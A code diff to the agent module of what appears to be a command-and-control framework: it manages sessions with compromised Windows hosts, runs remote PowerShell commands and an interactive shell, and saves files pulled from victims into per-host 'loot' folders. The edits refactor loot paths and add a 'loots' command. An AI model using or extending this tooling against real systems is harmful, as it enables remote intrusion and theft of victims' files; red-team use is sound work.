@@ -1,8 +1,8 @@
 from .common import *
-from .settings import HTTPFileServerSettings
+from .settings import HTTPFileServerSettings, CoreSettings
 from .session_manager import SessionManager
 from .database import AgentsDB
-from .payloads import powershell_download_file, powershell_upload_file, powershell_upload_file_ssl, powershell_download_file_ssl
+from .payloads import powershell_download_file, powershell_upload_file_ssl, powershell_upload_file, powershell_download_file_ssl
 
 from http.server import BaseHTTPRequestHandler
 from base64 import b64decode
@@ -22,6 +22,7 @@ class Agent:
 
 
     def get_agent_info(self, agent_ip):
+
         try:
 
             self.send_command("(Get-WmiObject -Class Win32_OperatingSystem).Caption")
@@ -37,7 +38,6 @@ class Agent:
                 self.send_command("whoami")
                 user = self.receive_all()
 
-                print(hostname, user)
 
             else:
 
@@ -91,7 +91,7 @@ class Agent:
         MainPrompt.rst_prompt_menu()
 
         AutoComplete.defaultCommands.append(session_id)
-        loot_path = f"Loots/{hostname}"
+        loot_path = CoreSettings.loot_path + f"{hostname}"
 
         try:
 
@@ -127,7 +127,7 @@ class Agent:
                     if error != 0:
                         agents_db.update_agent_status(session_id, "Inactive")
                         user = agents_db.get_agent_user(session_id)
-                        print(f"\n\n{ALERT} Connection with Agent {RST}{ORANGE}{user}{RST} lost")
+                        print(f"\n\n{INFO} Connection with Agent {RST}{ORANGE}{user}{RST} lost")
                         MainPrompt.rst_prompt_menu()
                         pass
 
@@ -201,7 +201,7 @@ class Agent:
         
         self.conn = None
         self.shell_active = False
-        print(f"\n{ALERT} Shell deactivated")
+        print(f"\n\n{ALERT} Shell deactivated")
 
 
     @staticmethod
@@ -284,6 +284,11 @@ class Agent:
                     elif main_arg == "clear":
                         clear_screen()
 
+                    elif main_arg == "loots":
+
+                        loots_path = SessionManager.loots_paths[list(SessionManager.current_session.keys())[0]]
+                        display_loots(loots_path)
+
                     elif main_arg == "upload":
 
                         args = command.split()
@@ -326,11 +331,14 @@ class Agent:
 
                         self.update_autocomplete_commands(command, file_names)
 
-                        print(f"{GREEN}{response}{RST}")
+                        if len(response) == 0:
+                            continue
+
+                        print(f"\n{GREEN}{response}{RST}\n")
+
 
                 except KeyboardInterrupt:
 
-                    print("\n")
                     self.close_shell()
                     break
 
@@ -459,7 +467,7 @@ class Agent:
                 self.send_command(download_payload)
                 self.receive_all()
 
-                print(f"{ADD} File successfully downloaded\n")
+                print(f"{ADD} File successfully downloaded in data/Loots\n")
 
             except ConnectionError:
 
@@ -513,12 +521,15 @@ class FileHandler(BaseHTTPRequestHandler):
     def do_POST(self):
                    
         file_name = os.path.basename(self.path)
+        session_id = list(SessionManager.current_session.keys())[0]
+        download_path = SessionManager.loots_paths[session_id]
+
         file_size = int(self.headers['Content-Length'])
                     
         print("")                   
         pr_bar = tqdm(total=file_size, unit='B', unit_scale=True, desc=f"Downloading {GREEN}{file_name}{RST}", ascii=True, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} {postfix}", colour='green')
 
-        with open(file_name, 'wb') as f:
+        with open(os.path.join(download_path, file_name), "wb") as f:
             
             for byte in range(0, file_size, 1024):
                 
